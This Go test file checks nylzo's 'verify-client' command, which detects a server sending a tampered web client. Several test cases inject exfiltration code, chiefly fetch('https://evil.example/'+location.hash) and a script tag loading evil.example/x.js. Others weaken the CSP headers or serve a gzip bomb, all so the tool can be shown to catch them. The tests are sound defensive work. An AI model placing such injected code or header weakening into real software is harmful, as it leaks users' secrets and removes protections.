package cli

import (
	"bytes"
	"compress/gzip"
	"io/fs"
	"log/slog"
	"maps"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/misaon/nylzo/internal/client"
	"github.com/misaon/nylzo/internal/server"
	"github.com/misaon/nylzo/internal/store/disk"
	"github.com/misaon/nylzo/internal/store/sqlite"
)

const (
	webIndex = `<!doctype html><html><head><script type="module" src="/assets/index-a1.js" nonce="__NYLZO_CSP_NONCE__"></script><link rel="stylesheet" href="/assets/style-b2.css" nonce="__NYLZO_CSP_NONCE__"></head><body></body></html>`
	webJS    = "console.log('nylzo')"
)

func gzipBytes(t *testing.T, data []byte) []byte {
	t.Helper()
	var out bytes.Buffer
	w := gzip.NewWriter(&out)
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func webFiles(t *testing.T) fstest.MapFS {
	t.Helper()
	return fstest.MapFS{
		"web/placeholder.html":             {Data: []byte("placeholder")},
		"web/dist/index.html":              {Data: []byte(webIndex)},
		"web/dist/assets/index-a1.js":      {Data: []byte(webJS)},
		"web/dist/assets/index-a1.js.gz":   {Data: gzipBytes(t, []byte(webJS))},
		"web/dist/assets/style-b2.css":     {Data: []byte("body{}")},
		"web/dist/assets/kdf-worker-c3.js": {Data: []byte("self.onmessage=null")},
	}
}

func newWebTestServer(t *testing.T, files fs.FS, version string, wrap func(http.Handler) http.Handler) string {
	t.Helper()
	dir := t.TempDir()
	cfg := server.Defaults()
	cfg.DataDir = dir
	cfg.Pepper = bytes.Repeat([]byte{7}, 32)
	cfg.Version = version
	st, err := sqlite.Open(t.Context(), filepath.Join(dir, "nylzo.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	blobs, err := disk.New(dir)
	if err != nil {
		t.Fatal(err)
	}
	srv, err := server.New(cfg, st, blobs, server.WithWebFiles(files), server.WithLogger(slog.New(slog.DiscardHandler)))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(srv.Close)
	handler := srv.Handler()
	if wrap != nil {
		handler = wrap(handler)
	}
	hs := httptest.NewServer(handler)
	t.Cleanup(hs.Close)
	return hs.URL
}

type served struct {
	header http.Header
	body   []byte
}

func rewrite(match func(*http.Request) bool, change func(*served)) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if !match(r) {
				next.ServeHTTP(w, r)
				return
			}
			rec := httptest.NewRecorder()
			next.ServeHTTP(rec, r)
			s := &served{header: rec.Header().Clone(), body: rec.Body.Bytes()}
			change(s)
			maps.Copy(w.Header(), s.header)
			w.Header().Del("Content-Length")
			w.WriteHeader(rec.Code)
			w.Write(s.body)
		})
	}
}

func pathIs(path string) func(*http.Request) bool {
	return func(r *http.Request) bool { return r.URL.Path == path }
}

func browserAsks(path string) func(*http.Request) bool {
	return func(r *http.Request) bool {
		return r.URL.Path == path && strings.Contains(r.Header.Get("Accept-Encoding"), "br")
	}
}

func runVerify(t *testing.T, url string, local fs.FS) result {
	t.Helper()
	var stdout, stderr bytes.Buffer
	env := Env{
		Stdout: &stdout, Stderr: &stderr, Getenv: env(nil), Terminal: noTerminal{}, Version: "test", TempDir: t.TempDir(),
		WebClient: func() (server.EmbeddedClient, error) { return server.LoadEmbedded(local) },
	}
	code := Run([]string{"verify-client", "--server", url}, env)
	return result{code: code, stdout: stdout.String(), stderr: stderr.String()}
}

func TestVerifyClientAcceptsTheSameClient(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	res := runVerify(t, newWebTestServer(t, files, "test", nil), files)
	if res.code != exitOK || res.stdout != "the server sends the web client of nylzo test unchanged: 5 pages and 3 files checked\n" {
		t.Fatalf("%+v", res)
	}
	if !strings.Contains(res.stderr, "targeted attack") {
		t.Fatalf("the result must say what it cannot see: %q", res.stderr)
	}
}

func TestVerifyClientRefusesAChangedClient(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		name string
		wrap func(http.Handler) http.Handler
		want string
	}{
		{"asset", rewrite(pathIs("/assets/index-a1.js"), func(s *served) {
			s.body = []byte("fetch('https://evil.example/'+location.hash)")
			s.header.Del("Content-Encoding")
		}), "/assets/index-a1.js: the file differs"},
		{"gzip variant for browsers only", rewrite(browserAsks("/assets/index-a1.js"), func(s *served) {
			s.body = gzipBytes(t, []byte("fetch('https://evil.example/'+location.hash)"))
			s.header.Set("Content-Encoding", "gzip")
		}), "/assets/index-a1.js (as a browser asks for it): the file differs"},
		{"uncompressed asset that a browser gets compressed", rewrite(browserAsks("/assets/style-b2.css"), func(s *served) {
			s.body = gzipBytes(t, []byte("body{background:url(https://evil.example/)}"))
			s.header.Set("Content-Encoding", "gzip")
		}), "/assets/style-b2.css (as a browser asks for it): the file differs"},
		{"brotli answer", rewrite(browserAsks("/assets/style-b2.css"), func(s *served) {
			s.header.Set("Content-Encoding", "br")
		}), "an encoding that this nylzo never sends"},
		{"gzip to a request without compression", rewrite(func(r *http.Request) bool {
			return r.URL.Path == "/assets/style-b2.css" && r.Header.Get("Accept-Encoding") == "identity"
		}, func(s *served) {
			s.body = gzipBytes(t, s.body)
			s.header.Set("Content-Encoding", "gzip")
		}), "compressed a response that was asked for without compression"},
		{"page for browsers only", rewrite(browserAsks("/"), func(s *served) {
			s.body = bytes.Replace(s.body, []byte("</head>"), []byte(`<script src="https://evil.example/x.js"></script></head>`), 1)
		}), "/ (as a browser asks for it): the page differs"},
		{"weaker referrer policy", rewrite(pathIs("/assets/style-b2.css"), func(s *served) {
			s.header.Set("Referrer-Policy", "unsafe-url")
		}), "the Referrer-Policy header differs"},
		{"reading page", rewrite(func(r *http.Request) bool { return strings.HasPrefix(r.URL.Path, "/m/") }, func(s *served) {
			s.body = bytes.Replace(s.body, []byte("</head>"), []byte(`<script src="https://evil.example/x.js"></script></head>`), 1)
		}), "the page differs"},
		{"weaker page CSP", rewrite(pathIs("/"), func(s *served) {
			s.header.Set("Content-Security-Policy", strings.Replace(s.header.Get("Content-Security-Policy"), "default-src 'none'", "default-src *", 1))
		}), "/: the Content-Security-Policy differs"},
		{"second CSP header", rewrite(pathIs("/sent"), func(s *served) {
			s.header.Add("Content-Security-Policy", "script-src *")
		}), "/sent: the Content-Security-Policy differs"},
		{"short nonce", rewrite(pathIs("/report"), func(s *served) {
			old := pageNonce.FindStringSubmatch(s.header.Get("Content-Security-Policy"))[1]
			s.header.Set("Content-Security-Policy", server.PageCSP("abc"))
			s.body = bytes.ReplaceAll(s.body, []byte(old), []byte("abc"))
		}), "/report: the Content-Security-Policy differs"},
		{"nonce that the page does not use", rewrite(pathIs("/transparency"), func(s *served) {
			s.header.Set("Content-Security-Policy", server.PageCSP("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
		}), "/transparency: the page does not use the nonce"},
		{"missing nosniff", rewrite(pathIs("/assets/kdf-worker-c3.js"), func(s *served) {
			s.header.Del("X-Content-Type-Options")
		}), "the X-Content-Type-Options header differs"},
		{"worker CSP", rewrite(pathIs("/assets/kdf-worker-c3.js"), func(s *served) {
			s.header.Set("Content-Security-Policy", "default-src *")
		}), "/assets/kdf-worker-c3.js: the headers differ"},
		{"content type", rewrite(pathIs("/assets/style-b2.css"), func(s *served) {
			s.header.Set("Content-Type", "text/html; charset=utf-8")
		}), "/assets/style-b2.css: the Content-Type differs"},
		{"manifest", rewrite(pathIs(server.ClientManifestPath), func(s *served) {
			s.body = bytes.Replace(s.body, []byte(`"sha256":"`), []byte(`"sha256":"0`), 1)
		}), "the server's client manifest differs"},
		{"gzip bomb", rewrite(browserAsks("/assets/index-a1.js"), func(s *served) {
			s.body = gzipBytes(t, bytes.Repeat([]byte{'a'}, 16<<20))
			s.header.Set("Content-Encoding", "gzip")
		}), "/assets/index-a1.js (as a browser asks for it): the file differs"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			files := webFiles(t)
			res := runVerify(t, newWebTestServer(t, files, "test", tc.wrap), files)
			if res.code != exitError || res.stdout != "" || !strings.Contains(res.stderr, tc.want) {
				t.Fatalf("want exit 1 with %q, got %+v", tc.want, res)
			}
		})
	}
}

func TestVerifyClientNeedsTheSameRelease(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	res := runVerify(t, newWebTestServer(t, files, "v9.9.9\x1b[31m", nil), files)
	if res.code != exitError || !strings.Contains(res.stderr, `the server runs nylzo v9.9.9\u001b[31m and this binary is test`) {
		t.Fatalf("%+v", res)
	}
}

func TestVerifyClientNeedsALocalClient(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	placeholder := fstest.MapFS{"web/placeholder.html": {Data: []byte("placeholder")}}
	res := runVerify(t, newWebTestServer(t, files, "test", nil), placeholder)
	if res.code != exitError || !strings.Contains(res.stderr, "carries no web client") {
		t.Fatalf("%+v", res)
	}
}

func TestVerifyClientNeedsAServer(t *testing.T) {
	t.Parallel()
	res := runWith(t, "", nil, nil, "verify-client")
	if res.code != exitUsage || !strings.Contains(res.stderr, "needs --server or NYLZO_SERVER") {
		t.Fatalf("%+v", res)
	}
	res = runWith(t, "", nil, nil, "verify-client", "--server", "http://example.org")
	if res.code != exitError || !strings.Contains(res.stderr, "https") {
		t.Fatalf("plain http to a remote server must be refused: %+v", res)
	}
}

func TestDecodedStopsAtTheLimit(t *testing.T) {
	t.Parallel()
	bomb := client.Fetched{Header: http.Header{"Content-Encoding": {"gzip"}}, Body: gzipBytes(t, bytes.Repeat([]byte{'a'}, 64<<20))}
	body, err := decoded(bomb, browserEncodings, 10, "/x")
	if err != nil || len(body) != 11 {
		t.Fatalf("decoded %d bytes, %v", len(body), err)
	}
}
